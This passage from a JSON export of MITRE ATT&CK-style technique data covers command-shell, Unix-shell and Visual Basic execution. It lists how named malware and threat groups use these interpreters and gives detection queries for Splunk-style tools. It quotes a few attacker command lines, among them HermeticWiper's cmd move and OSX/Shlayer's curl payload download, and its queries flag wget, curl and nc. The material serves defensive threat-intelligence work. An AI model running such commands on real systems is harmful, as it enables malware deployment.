      "HermeticWipercan usecmd.exe /Q/c move CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1 CSIDL_WINDOWS\\policydefinitions\\postgresql.exe 1> \\\\127.0.0.1\\ADMIN$\\_1636727589.6007507 2>&1to deploy on an infected system.[169]",
      "HermeticWizardcan usecmd.exefor execution on compromised hosts.[169]",
      "Hi-Zorhas the ability to create a reverse shell.[170]",
      "HiddenWaspuses a script to automate tasks on the victim's machine and to assist in execution.[171]",
      "Higaisausedcmd.exefor execution.[172][173][174]",
      "Hikithas the ability to create a remote shell and run given commands.[175]",
      "HOMEFRYuses a command-line interface.[176]",
      "DuringHomeLand Justice, threat actors used Windows batch files for persistence and execution.[177][178]",
      "HOPLIGHTcan launch cmd.exe to execute commands on the system.[179]",
      "HotCroissantcan remotely open applications on the infected host with theShellExecuteAcommand.[180]",
      "HTTPBrowseris capable of spawning a reverse shell on a victim.[181]",
      "httpclientopens cmd.exe on the victim.[3]",
      "INC Ransomhas usedcmd.exeto launch malicious payloads.[182]",
      "Indrik Spiderhas used batch scripts on victim's machines.[183][184]",
      "InnaputRATlaunches a shell to execute commands on the victim’s machine.[185]",
      "InvisiMolecan launch a remote shell to execute commands.[186][187]",
      "IPsec Helpercan run arbitrary commands passed to it throughcmd.exe.[10]",
      "Ixesheis capable of executing commands viacmd.[188]",
      "JCryhas usedcmd.exeto launch PowerShell.[189]",
      "JHUHUGITuses a .bat file to execute a .dll.[17]",
      "JPINcan use the command-line utility cacls.exe to change file permissions.[6]",
      "jRAThas command line access.[190]",
      "Kapekaallows for arbitrary Windows command execution.[191]",
      "Kasidetcan execute commands using cmd.exe.[192]",
      "Kazuaruses cmd.exe to execute commands on the victim’s machine.[193]",
      "Ke3changhas used batch scripts in its malware to install persistence mechanisms.[194]",
      "Kevincan use a renamed image ofcmd.exefor execution.[195]",
      "KeyBoycan launch interactive shells for communicating with the victim machine.[196][197]",
      "KEYMARBLEcan execute shell commands using cmd.exe.[198]",
      "KGH_SPYhas the ability to set a Registry key to run a cmd.exe command.[199]",
      "Kimsukyhas executed Windows commands by usingcmdand running batch scripts.[200][201]",
      "Koadiccan open an interactive command-shell to perform command line functions on victim machines.Koadicperforms most of its operations using Windows Script Host (Jscript) and to run arbitrary shellcode.[202][203]",
      "KOCTOPUShas usedcmd.exeand batch files for execution.[203]",
      "KOMPROGOis capable of creating a reverse shell.[204]",
      "KONNIhas used cmd.exe to execute arbitrary commands on the infected host across different stages of the infection chain.[205][206][207]",
      "TheLatrodectuscommand handler can usecmdexeto run multiple discovery commands.[208][209]",
      "Lazarus Groupmalware uses cmd.exe to execute commands on a compromised host.[210][211][212][213][214]A Destover-like variant used byLazarus Groupuses a batch file mechanism to delete its binaries from the system.[215]",
      "LazyScripterhas used batch files to deploy open-source and multi-stage RATs.[203]",
      "LightNeuronis capable of executing commands via cmd.exe.[216]",
      "Linfocreates a backdoor through which remote attackers can start a remote shell.[217]",
      "Lizarhas a command to open the command-line on the infected system.[218][219]",
      "LockBit 2.0can use the Windows command shell for multiple post-compromise actions on objective.[220][221][222]",
      "Lokibothas usedcmd /ccommands embedded within batch scripts.[223]",
      "LookBackexecutes thecmd.execommand.[224]",
      "LoudMinerused a batch script to run the Linux virtual machine as a service.[225]",
      "Lucifercan issue shell commands to download and execute additional payloads.[226]",
      "LunarWebcan run shell commands using a BAT file with a name matching%TEMP%\\<⁠random_9_alnum_chars>.batfileor through cmd.exe with the/cand/Uoption for Unicode output.[227]",
      "Machetehas used batch files to initiate additional downloads of malicious files.[228]",
      "Mafaldacan execute shell commands usingcmd.exe.[229]",
      "Magic Houndhas used the command-line interface for code execution.[230][231][232]",
      "MagicRATallows for the execution of arbitrary commands on the victim system.[233]",
      "Manjusakacan execute arbitrary commands passed to it from the C2 controller viacmd.exe /c.[234]",
      "MarkiRATcan utilize cmd.exe to execute commands in a victim's environment.[235]",
      "TheMazeencryption process has used batch scripts with various commands.[236][237]",
      "MCMDcan launch a console process (cmd.exe) with redirected standard input and output.[238]",
      "MechaFlounderhas the ability to run commands on a compromised host.[239]",
      "MegaCortexhas used.cmdscripts on the victim's system.[240]",
      "Megazordcan execute multiple commands post infection viacmd.exe.[241]",
      "menuPassexecutes commands using a command-line interface and reverse shell. The group has used a modified version of pentesting script wmiexec.vbs to execute commands.[242][243][244][245]menuPasshas used malicious macros embedded inside Office documents to execute files.[246][245]",
      "Metadorhas used the Windows command line to execute commands.[247]",
      "Metamorfohas usedcmd.exe /cto execute files.[248]",
      "Meteorcan runset.bat,update.bat,cache.bat,bcd.bat,msrun.bat, and similar scripts.[249]",
      "Micropsiacreates a command-line shell using cmd.exe.[250]",
      "Milancan usecmd.exefor discovery actions on a targeted system.[104]",
      "MirageFoxhas the capability to execute commands using cmd.exe.[251]",
      "Mis-Typehas usedcmd.exeto run commands on a compromised host.[252]",
      "Misdatis capable of providing shell functionality to the attacker to execute commands.[252]",
      "Mivasthas the capability to open a remote shell and run basic commands.[253]",
      "MoleNetcan execute commands via the command line utility.[118]",
      "MoonWindcan execute commands via an interactive command shell.[254]MoonWinduses batch scripts for various purposes, including to restart and uninstall itself.[254]",
      "More_eggshas used cmd.exe for execution.[255][256]",
      "Mosquitoexecutes cmd.exe and uses a pipe to read the results and send back the output to the C2 server.[257]",
      "MuddyWaterhas used a custom tool for creating reverse shells.[258]",
      "MultiLayer Wiperuses a batch script launched via a scheduled task to delete Windows Event Logs.[259]",
      "MURKYTOPuses the command-line interface.[176]",
      "Mustang Pandahas executed HTA files via cmd.exe, and used batch scripts for collection.[260][261]",
      "NanoCorecan open a remote command-line interface and execute commands.[262]NanoCoreuses JavaScript files.[263]",
      "NavRATleverages cmd.exe to perform discovery techniques.[264]NavRATloads malicious shellcode and executes it in memory.[264]",
      "Nebulaecan use CMD to execute a process.[265]",
      "NETEAGLEallows adversaries to execute shell commands on the infected host.[39]",
      "Operators deployingNetwalkerhave used batch scripts to retrieve theNetwalkerpayload.[266]",
      "NETWIREcan issue commands using cmd.exe.[267][268]",
      "DuringNight Dragon, threat actors usedzwShellto establish full remote control of the connected machine and run command-line shells.[269]",
      "Nightdoorcreates a cmd.exe shell to send and receive commands from the command and control server via open pipes.[270]",
      "njRATcan launch a command shell interface for executing commands.[271]",
      "Nomadic Octopususedcmd.exe /cwithin a malicious macro.[272]",
      "OceanSaltcan create a reverse shell on the infected endpoint using cmd.exe.[273]OceanSalthas been executed via malicious macros.[273]",
      "ODAgentcan execute a specified command line passed via API.[274]",
      "OilBoosterhas the ability to execute shell commands and exfiltrate the results.[274]",
      "OilRighas used macros to deliver malware such asQUADAGENTandOopsIE.[275][276][277][278][279]OilRighas used batch scripts.[275][276][277][278][279]",
      "Okrum's backdoor has used cmd.exe to execute arbitrary commands as well as batch scripts to update itself to a newer version.[280]",
      "OopsIEuses the command prompt to execute commands on the victim's machine.[277][281]",
      "DuringOperation CuckooBees, the threat actors used batch scripts to perform reconnaissance.[282]",
      "DuringOperation Dream Job,Lazarus Grouplaunched malicious DLL files, created new folders, and renamed folders with the use of the Windows command shell.[283][284]",
      "DuringOperation Honeybee, various implants used batch scripting andcmd.exefor execution.[285]",
      "DuringOperation Wocao, threat actors spawned a newcmd.exeprocess to execute commands.[286]",
      "Orzcan execute shell commands.[287]Orzcan execute commands with JavaScript.[287]",
      "Out1can use native command line for execution.[288]",
      "OutSteelhas usedcmd.exeto scan a compromised host for specific file extensions.[289]",
      "Patchworkran a reverse shell with Meterpreter.[290]Patchworkused JavaScript code and .SCT files on victim machines.[43][291]",
      "PcSharecan executecmdcommands on a compromised host.[73]",
      "Peppyhas the ability to execute shell commands.[292]",
      "PHOREALis capable of creating reverse shell.[204]",
      "Pikabotcan execute Windows shell commands viacmd.exe.[293]",
      "PingPullcan usecmd.exeto run various commands as a reverse shell.[294]",
      "Pisloaderuses cmd.exe to set the Registry Run key value. It also has a command to spawn a command shell.[295]",
      "PLAINTEEuses cmd.exe to execute commands on the victim’s machine.[296]",
      "Playhas used a batch script to remove indicators of its presence on compromised hosts.[297]",
      "PLEADhas the ability to execute shell commands on the compromised host.[298]",
      "PlugXallows actors to spawn a reverse shell on a victim.[181][299]",
      "PoetRAThas called cmd through a Word document macro.[300]",
      "PoisonIvycreates a backdoor through which remote attackers can open a command-line interface.[301]",
      "Ponyhas used batch scripts to delete itself after execution.[302]",
      "PowerDukerunscmd.exe /cand sends the output to its C2.[303]",
      "POWRUNERcan execute commands from its C2 server.[275]",
      "Proxysvcexecutes a binary on the system and logs the results into a temp file by using:cmd.exe /c \"> %temp%\\PM* .tmp 2>&1\".[215]",
      "Pteranodoncan usecmd.exefor execution on victim systems.[150][304]",
      "PyDCrypthas usedcmd.exefor execution.[305]",
      "QakBotcan use cmd.exe to launch itself and to execute multiple C2 commands.[306][307][308][93]",
      "QUADAGENTuses cmd.exe to execute scripts and commands on the victim’s machine.[278]",
      "QuasarRATcan launch a remote shell to execute commands on the victim’s machine.[309][310]",
      "Ragnar Lockerhas used cmd.exe and batch scripts to execute commands.[311]",
      "RainyDaycan use the Windows Command Shell for execution.[265]",
      "Rancorhas used cmd.exe to execute commmands.[296]",
      "RansomHubcan usecmd.exeto execute multiple commands on infected hosts.[312]",
      "Raspberry Robinuses cmd.exe to read and execute a file stored on an infected USB device as part of initial installation.[313]",
      "RATANKBAuses cmd.exe to execute commands.[314][315]",
      "RCSessioncan usecmd.exefor execution on compromised hosts.[81]",
      "RDAThas executed commands usingcmd.exe /c.[316]",
      "RedCurlhas used the Windows Command Prompt to execute commands.[317][318][319]",
      "RedLeavescan receive and execute commands with cmd.exe. It can also provide a reverse shell.[243][320]",
      "Remcoscan launch a remote command line to execute commands on the victim’s machine.[321]",
      "Remexisilently executes received commands with cmd.exe.[322]",
      "Revenge RATuses cmd.exe to execute commands and run scripts on the victim's machine.[323]",
      "REvilcan use the Windows command line to delete volume shadow copies and disable recovery.[324][325][326][327]",
      "RGDooruses cmd.exe to execute commands on the victim’s machine.[328]",
      "Rising Sunhas executed commands usingcmd.exe /c \"<command> > <%temp%>\\AM<random>. tmp\" 2>&1.[329]",
      "ROADSWEEPcan open cmd.exe to enable command execution.[330][178]",
      "RobbinHooduses cmd.exe on the victim's computer.[331]",
      "RogueRobinuses Windows Script Components.[332][333]",
      "RTMuses the command line and rundll32.exe to execute.[334]",
      "RunningRATuses a batch file to kill a security program task and then attempts to remove itself.[155]",
      "Ryukhas usedcmd.exeto create a Registry entry to establish persistence.[335]",
      "S-Typehas provided the ability to execute shell commands on a compromised host.[252]",
      "Saint Bearinitial loaders will also drop a malicious Windows batch file, available via open source GitHub repositories, that disables Microsoft Defender functionality.[289]",
      "Saint Bothas usedcmd.exeand.batscripts for execution.[289]",
      "Sakulacalls cmd.exe to run various DLL files via rundll32 and also to perform file cleanup.Sakulaalso has the capability to invoke a reverse shell.[336]",
      "SampleCheck5000can call cmd.exe to execute C2 command line strings.[337][274]",
      "SamSamuses custom batch scripts to execute some of its components.[338]",
      "Samuraican use a remote command module for execution via the Windows command line.[339]",
      "Sardonichas the ability to runcmd.exeor other interactive processes on a compromised computer.[144]",
      "SDBbothas the ability to use the command shell to execute commands on a compromised host.[340]",
      "SeaDukeis capable of executing commands.[341]",
      "Seasaltuses cmd.exe to create a reverse shell on the infected endpoint.[50]",
      "SEASHARPEEcan execute commands on victims.[342]",
      "ServHelpercan execute shell commands againstcmd.[343][344]",
      "Seth-Lockercan execute commands via the command line shell.[345]",
      "Sharkhas the ability to useCMDto execute commands.[104][346]",
      "SharpDiscocan usecmd.exeto execute plugins and to send command output to  specified SMB shares.[347]",
      "SharpStagecan execute arbitrary commands with the command line.[118][119]",
      "ShimRatcan be issued a command shell function from the C2.[348]",
      "SideTwistcan execute shell commands on a compromised host.[349]",
      "Silencehas used Windows command-line to run commands.[350][351][352]",
      "SILENTTRINITYcan usecmd.exeto enable lateral movement using DCOM.[353]",
      "Siloscapecan run cmd through an IRC channel.[354]",
      "SLOTHFULMEDIAcan open a command line to execute commands.[355]",
      "Small Sievecan usecmd.exeto execute commands on a victim's system.[356]",
      "SNUGRIDEis capable of executing commands and spawning a reverse shell.[320]",
      "During theSolarWinds Compromise,APT29usedcmd.exeto execute commands on remote machines.[357][358]",
      "Sowbughas used command line during its intrusions.[359]",
      "Sparkcan use cmd.exe to run commands.[360]",
      "SQLRathas used SQL to execute JavaScript and VB scripts on the host system.[139]",
      "Squirrelwafflehas usedcmd.exefor execution.[361]",
      "STARWHALEhas the ability to execute commands viacmd.exe.[362]",
      "Storm-1811has used multiple batch scripts during initial access and subsequent actions on victim machines.[363][364]",
      "StreamExhas the ability to remotely execute commands.[365]",
      "StrelaStealerhas included BAT files in some instances for installation.[366][367]",
      "StrifeWatercan execute shell commands usingcmd.exe.[368]",
      "Several tools used bySuckflyhave been command-line driven.[369]",
      "SUGARUSHhas usedcmdfor execution on an infected host.[370]",
      "SYSCONhas the ability to execute commands throughcmdon a compromised host.[71]",
      "TA505has executed commands usingcmd.exe.[371]",
      "TA551has usedcmd.exeto execute commands.[372]",
      "TA577has used BAT files in malware execution chains.[373]",
      "Taidoorcan copy cmd.exe into the system temp folder.[374]",
      "TAINTEDSCRIBEcan enable Windows CLI access and execute files.[375]",
      "TAMECAThas usedcmd.exeto run thecurlcommand.[376]",
      "Tarraskmay abuse the Windows schtasks command-line tool to create \"hidden\" scheduled tasks.[377]",
      "TDTESSprovides a reverse shell on the victim.[378]",
      "TeamTNThas used batch scripts to download tools and executing cryptocurrency miners.[379]",
      "TEXTMATEexecutes cmd.exe to provide a reverse shell to adversaries.[380][381]",
      "Threat Group-1314actors spawned shells on remote systems on a victim network to execute commands.[382]",
      "Threat Group-3390has used command-line interfaces for execution.[77][383]",
      "TinyTurlahas been installed using a .bat file.[384]",
      "TinyZBotsupports execution from the command-line.[385]",
      "ToddyCathas used .bat scripts andcmdfor execution on compromised hosts.[386]",
      "TrickBothas used macros in Excel documents to download and deploy the malware on the user’s machine.[387]",
      "Trojan.Karaganycan perform reconnaissance commands on a victim machine via a cmd.exe process.[388]",
      "Troll Stealercan create and execute Windows batch scripts.[389]",
      "Tropic Trooperhas used Windows command scripts.[390]",
      "TSCookiehas the ability to execute shell commands on the infected host.[391]",
      "Turiancan create a remote shell and execute commands usingcmd.[392]",
      "TurlaRPC backdoors have used cmd.exe to execute commands.[393][394]",
      "TURNEDUPis capable of creating a reverse shell.[395]",
      "TYPEFRAMEcan uninstall malware components using a batch script.[396]TYPEFRAMEcan execute commands using a shell.[396]",
      "UBoatRATcan start a command shell.[397]",
      "Umbreonprovides access using both standard facilities like SSH and additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet[398]",
      "UPPERCUTuses cmd.exe to execute commands on the victim’s machine.[245]",
      "Uroburoshas the ability to use the command line for execution on the targeted system.[399]",
      "USBferrycan execute various Windows commands.[390]",
      "Volgmercan execute commands on the victim's machine.[400][401]",
      "Volt Typhoonhas used the Windows command line to perform hands-on-keyboard activities in targeted environments including for discovery.[402][403][404][405]",
      "WarzoneRATcan usecmd.exeto execute malicious code.[406]",
      "WastedLockerhas usedcmdto execute commands on the system.[407]",
      "Water Curupira Pikabot Distributioninstallation via JavaScript will launch follow-on commands via cmd.exe.[408]",
      "WEBC2can open an interactive command shell.[13]",
      "WellMesscan execute command line scripts received from C2.[409]",
      "WhisperGatecan usecmd.exeto execute commands.[410]",
      "Wiarpcreates a backdoor through which remote attackers can open a command line interface.[411]",
      "Winter Viverndistributed Windows batch scripts disguised as virus scanners to prompt download of malicious payloads using built-in system tools.[412][413]",
      "Wizard Spiderhas usedcmd.exeto execute commands on a victim's machine.[414][415]",
      "Woody RATcan execute commands usingcmd.exe.[416]",
      "xCaonhas a command to start an interactive shell.[62]",
      "XTunnelhas been used to execute remote commands.[417]",
      "Zebrocyuses cmd.exe to execute commands on the system.[418][419]",
      "Zeus Pandacan launch an interface where it can execute several commands on the victim’s PC.[420]",
      "ZIRCONIUMhas used a tool to open a Windows Command Shell on a remote host.[421]",
      "ZLibhas the ability to execute shell commands.[252]",
      "zwShellcan launch command-line shells.[269]",
      "ZxShellcan launch a reverse command shell.[29][422][423]"
    ]
  },
  "T1059.004": {
    "Name": "Command and Scripting Interpreter:Unix Shell",
    "Description": "Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux, macOS, and ESXi systems, though many variations of the Unix shell exist (e.g. sh, ash, bash, zsh, etc.) depending on the specific OS or distribution.[1][2]Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as withSSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.Some systems, such as embedded devices, lightweight Linux distributions, and ESXi servers, may leverage stripped-down Unix shells via Busybox, a small executable that contains a variety of tools, including a simple shell.",
    "Detects": [
      "Monitor executed commands and arguments that may abuse Unix shell commands and scripts for execution. Unix shell usage may be common on administrator, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled (such as on many ESXi servers), scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.Note: this analytic does not include an exhaustive list of potentially suspicious commands that could be executed through a shell interpreter. Instead, it is meant to serve as an example of types of commands that can warrant further investigation.Analytic 1 - Unusual command executionsourcetype=\"linux_logs\" CommandLine=\"sh -c\" AND (CommandLine=\"wget\" OR CommandLine=\"curl\" OR CommandLine=\"nc\" OR CommandLine=\"perl\")",
      "Monitor for newly executed processes that may abuse Unix shell commands and scripts for execution.Analytic 1 - Look for unusual Unix shell process creation.sourcetype=linux_secure OR sourcetype=macos_secure| search (command=\"sh\" OR command=\"bash\" OR command=\"zsh\")| eval suspicious_process=if(like(command_line, \"%.sh\" OR \"%.bash\" OR \"%.zsh\"), \"Yes\", \"No\")| where suspicious_process=\"Yes\""
    ],
    "Procedure Examples": [
      "Anchorcan execute payloads via shell scripting.[3]",
      "AppleJeushas used shell scripts to execute commands after installation and set persistence mechanisms.[4][5]",
      "APT41used Linux shell commands for system survey and information gathering prior to exploitation of vulnerabilities such as CVE-2019-19871.[6]",
      "Aquatic Pandaused malicious shell scripts in Linux environments following access via SSH to install Linux versions of Winnti malware.[7]",
      "BOLDMOVEis capable of spawning a remote command shell.[8]",
      "BPFDoorcan create a reverse shell and supports vt100 emulator formatting.[9]",
      "Bundlorehas leveraged /bin/sh and /bin/bash to execute commands on the victim machine.[10]",
      "CallMehas the capability to create a reverse shell on victims.[11]",
      "Chaosprovides a reverse shell connection on 8338/TCP, encrypted via AES.[12]",
      "COATHANGERprovides a BusyBox reverse shell for command and control.[13]",
      "CoinTickerexecutes a bash script to establish a reverse shell.[14]",
      "CookieMinerhas used a Unix shell script to run a series of commands targeting macOS.[15]",
      "Cuckoo Stealercan spawn a bash shell to enable execution on compromised hosts.[16]",
      "Derusbiis capable of creating a remote Bash shell and executing commands.[17][18]",
      "Dokihas executed shell scripts with /bin/sh.[19]",
      "Drovorubcan execute arbitrary commands as root on a compromised system.[20]",
      "Eburycan use the commandsXcshorXclsto open a shell withEburylevel permissions andXxshto open a shell with root level.[21]",
      "Exaramel for Linuxhas a command to execute a shell command on the system.[22][23]",
      "FLORAHOX Activityhas executed multiple Bash controller scripts to provide command line inputs for FLORAHOX traversal configurations.[24]",
      "Fysbishas the ability to create and execute commands in a remote shell for CLI.[25]",
      "Gomirreads command line arguments and parses them for functionality when executed from a Linux shell, and can execute arbitrary strings passed to it as shell commands.[26]",
      "Green Lambertcan use shell scripts for execution, such as/bin/sh -c.[27][28]",
      "Hildegardhas used shell scripts for execution.[29]",
      "TheJ-magicagent is executed through a command line argument which specifies an interface and listening port.[30]",
      "Kazuaruses /bin/bash to execute commands on the victim’s machine.[31]",
      "Kinsinghas used Unix shell scripts to execute commands in the victim environment.[32]",
      "Kobaloscan spawn a new pseudo-terminal and execute arbitrary commands at the command prompt.[33]",
      "KV Botnet Activityutilizes multiple Bash scripts during botnet installation stages, and the final botnet payload allows for running commands in the Bash shell.[34]",
      "LoudMinerused shell scripts to launch various services and to start/stop the QEMU virtualization.[35]",
      "MacMacan execute supplied shell commands and uses bash scripts to perform additional actions.[36][37]",
      "NETWIREhas the ability to use/bin/bashand/bin/shto execute commands.[38][39]",
      "NKAbuseis initially installed and executed through an initial shell script.[40]",
      "DuringOperation MidnightEclipse, threat actors piped output from stdout to bash for execution.[41][42]",
      "OSX/Shlayercan use bash scripts to check the macOS version, download payloads, and extract bytes from files.OSX/Shlayeruses the commandsh -c tail -c +1381...to extract bytes at an offset from a specified file.OSX/Shlayeruses thecurl -fsL \"$url\" >$tmp_pathcommand to download malicious payloads into a temporary directory.[43][44][45][46]",
      "OSX_OCEANLOTUS.Duses a shell script as the main executable inside an app bundle and drops an embedded base64-encoded payload to the/tmpfolder.[47][48]",
      "PACEMAKERcan use a simple bash script for execution.[49]",
      "Penquincan execute remote commands using bash scripts.[50]",
      "PITSTOPhas the ability to receive shell commands over a Unix domain socket.[51]",
      "Protonuses macOS' .command file type to script actions.[52]",
      "PULSECHECKcan use Unix shell script for command execution.[49]",
      "Rockeused shell scripts to run commands which would obtain persistence and execute the cryptocurrency mining malware.[53]",
      "Sea Turtleused shell scripts for post-exploitation execution in victim environments.[54][55]",
      "Skidmaphas usedpm.shto download and install its main payload.[56]",
      "SnappyTCPcreates the reverse shell using a pthread spawning a bash shell.[54]",
      "TeamTNThas used shell scripts for execution.[57][58]",
      "Turianhas the ability to use/bin/shto execute commands.[59]",
      "Velvet Antused a custom tool, VELVETSTING, to parse encoded inbound commands to compromised F5 BIG-IP devices and then execute them via the Unix shell.[60]",
      "Volt Typhoonhas used Brightmetricagent.exe which contains a command- line interface (CLI) library that can leverage command shells including Z Shell (zsh).[61]",
      "WindTailcan use theopencommand to execute an application.[62]",
      "XCSSETuses a shell script to execute Mach-o files andosacompilecommands such as,osacompile -x -o xcode.app main.applescript.[63]",
      "ZIPLINEcan use/bin/shto create a reverse shell and execute commands.[64]"
    ]
  },
  "T1059.005": {
    "Name": "Command and Scripting Interpreter:Visual Basic",
    "Description": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such asComponent Object Modeland theNative APIthrough the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.[1][2]Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.[3][4]VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place ofJavaScripton HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).[5]Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content intoSpearphishing Attachmentpayloads (which may also involveMark-of-the-Web Bypassto enable execution).[6]",
    "Detects": [
      "Monitor executed commands and arguments that may abuse Visual Basic (VB) for execution.Analytic 1 - Look for unusual VB execution.sourcetype=wineventlog OR sourcetype=linux_secure OR sourcetype=macos_secure| search (command=\"cscript.exe\" OR command=\"wscript.exe\" OR command=\".vbs\" OR command=\".vba\" OR command=\".vbe\")| eval suspicious_cmd=if(like(command_line, \"%.vbs\" OR \"%.vba\" OR \"%.vbe\"), \"Yes\", \"No\")| where suspicious_cmd=\"Yes\"",
      "Monitor for the loading of modules associated with VB languages (ex: vbscript.dll).Note: For Windows, Sysmon Event ID 7 (Image loaded) can be used to alert on the loading of DLL modules (e.g., vbscript.dll) associated with Visual Basic into processes. Due to the high frequency of image load operations, Event ID 7 can generate a large volume of events. Therefore, we recommend tuning the Sysmon configuration file to exclude common, benign image loads that may result in false positives. This query focuses on monitoring the loading of specific VB-related modules such asvbe6.dll,vbscript.dll, andvba7.dll, which are commonly associated with VB script execution.Analytic 1 - Look for unusual VB module loads.sourcetype=windows_security OR sourcetype=wineventlog OR sourcetype=linux_secure OR sourcetype=macos_secure| search (module=\"vbe6.dll\" OR module=\"vbscript.dll\" OR module=\"vba7.dll\")| eval suspicious_module=if(like(module, \"vbe6.dll\" OR \"vbscript.dll\" OR \"vba7.dll\"), \"Yes\", \"No\")| where suspicious_module=\"Yes\"",
      "Monitor for the creation of processes related to VBScript and VBA execution. Monitor for events associated with VB execution, such as Office applications spawning processes, usage of the Windows Script Host (typically cscript.exe or wscript.exe). VB execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used.Note: This query monitors for the creation of processes like cscript.exe, wscript.exe, excel.exe, and winword.exe, which are commonly used to execute VB scripts. It highlights instances where these processes are initiated, providing insight into potential VB script execution.Analytic 1 - Look for unusual VB process creation.sourcetype=windows_security OR sourcetype=wineventlog OR sourcetype=linux_secure OR sourcetype=macos_secure| search (process=\"cscript.exe\" OR process=\"wscript.exe\" OR process=\"excel.exe\" OR process=\"winword.exe\")| eval suspicious_process=if(like(process, \"cscript.exe\" OR \"wscript.exe\" OR \"excel.exe\" OR \"winword.exe\"), \"Yes\", \"No\")| where suspicious_process=\"Yes\"",
      "Monitor for any attempts to enable scripts running on a system that would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.Note: Be aware of VBScript execution from temporary or unusual file locations, which may indicate malicious activity.Analytic 1 - Script Execution from Temporary Locations(source=WinEventLog:\"Microsoft-Windows-PowerShell/Operational\" EventID=\"4103\") | WHERE CommandLine LIKE \"AppData.vbs\" OR CommandLine LIKE \"AppData.vbe\" OR CommandLine LIKE \"AppData.vba\""
    ],
    "Procedure Examples": [
      "During the2015 Ukraine Electric Power Attack,Sandworm Teaminstalled a VBA script calledvba_macro.exe. This macro droppedFONTCACHE.DAT, the primaryBlackEnergyimplant;rundll32.exe, for executing the malware;NTUSER.log, an empty file; and desktop.ini, the default file used to determine folder displays on Windows machines.[7]",
      "During the2016 Ukraine Electric Power Attack,Sandworm Teamcreated VBScripts to run on an SSH server.[8]",
      "APT-C-36has embedded a VBScript within a malicious Word document which is executed upon the document opening.[9]",
      "APT32has used macros, COM scriptlets, and VBS scripts.[10][11]",
      "APT33has used VBScript to initiate the delivery of payloads.[12]",
      "APT37executes shellcode and a VBA script to decode Base64 strings.[13]",
      "APT38has used VBScript to execute commands and other operational tasks.[14][15]",
      "APT39has utilized malicious VBS scripts in malware.[16]",
      "APT42has used a VBScript to query anti-virus products.[17]",
      "Astarothhas used malicious VBS e-mail attachments for execution.[18]",
      "BabySharkcan execute additional  VisualBasic content.[19]",
      "BackConfighas used VBS to install its downloader component and malicious documents with VBA macro code.[20]",
      "Bandookhas used malicious VBA code against the target system.[21]",
      "Bisonal's dropper creates VBS scripts on the victim’s machine.[22][23]",
      "BRONZE BUTLERhas used VBS and VBE scripts for execution.[24][25]",
      "Bumblebeecan create a Visual Basic script to enable persistence.[26][27]",
      "ForC0011,Transparent Tribeused malicious VBA macros within a lure document as part of theCrimsonmalware installation process onto a compromised host.[28]",
      "DuringC0015, the threat actors used a malicious HTA file that contained a mix of HTML and JavaScript/VBScript code.[29]",
      "Chaeshas used VBscript to execute malicious code.[30]",
      "CHIMNEYSWEEPhas executed a script named cln.vbs on compromised hosts.[31]",
      "Cobalt Grouphas sent Word OLE compound documents with malicious obfuscated VBA macros that will run upon user execution.[32][33][34][35][36][37]",
      "Cobalt Strikecan use VBA to perform execution.[38][39][40]",
      "Comnieexecutes VBS scripts.[41]",
      "Confuciushas used VBScript to execute malicious code.[42]",
      "DanBotcan use a VBA macro embedded in an Excel file to drop the payload.[43]",
      "DarkGateinitial infection mechanisms include masquerading as pirated media that launches malicious VBScript on the victim.[44]",
      "Donutcan generate shellcode outputs that execute via VBScript.[45]",
      "Earth Luscaused VBA scripts.[46]",
      "Emotethas sent Microsoft Word documents with embedded macros that will invoke scripts to download additional payloads.[47][48][49][50][51]",
      "Exaramel for Windowshas a command to execute VBS scripts on the victim’s machine.[52]",
      "Ferocioushas the ability to use Visual Basic scripts for execution.[53]",
      "FIN13has used VBS scripts for code execution on comrpomised machines.[54]",
      "FIN4has used VBA macros to display a dialog box and collect victim credentials.[55][56]",
      "FIN7used VBS scripts to help perform tasks on the victim's machine.[57][58][59]",
      "Flagprocan execute malicious VBA macros embedded in .xlsm files.[60]",
      "DuringFrankenstein, the threat actors used Word documents that prompted the victim to enable macros and run a Visual Basic script.[61]",
      "DuringFunnyDream, the threat actors used a Visual Basic script to run remote commands.[62]",
      "Gamaredon Grouphas embedded malicious macros in document templates, which executed VBScript.Gamaredon Grouphas also delivered Microsoft Outlook VBA projects with embedded macros.[63][64][65][66][67]",
      "Goopyhas the ability to use a Microsoft Outlook backdoor macro to communicate with its C2.[11]",
      "Gorgon Grouphas used macros inSpearphishing Attachments as well as executed VBScripts on victim machines.[68]",
      "Grandoreirocan use VBScript to execute malicious code.[18][69]",
      "One version ofHelminthconsists of VBScript scripts.[70]",
      "HEXANEhas used a VisualBasic script namedMicrosoftUpdator.vbsfor execution of a PowerShell keylogger.[71]",
      "Higaisahas used VBScript code on the victim's machine.[72]",
      "IcedIDhas used obfuscated VBA string expressions.[73]",
      "Inceptionhas used VBScript to execute malicious commands and payloads.[74][75]",
      "IPsec Helpercan run arbitrary Visual Basic scripts and commands passed to it.[76]",
      "Javalihas used embedded VBScript to download malicious payloads from C2.[18]",
      "JCryhas used VBS scripts.[77]",
      "jRAThas been distributed as HTA files with VBScript.[78]",
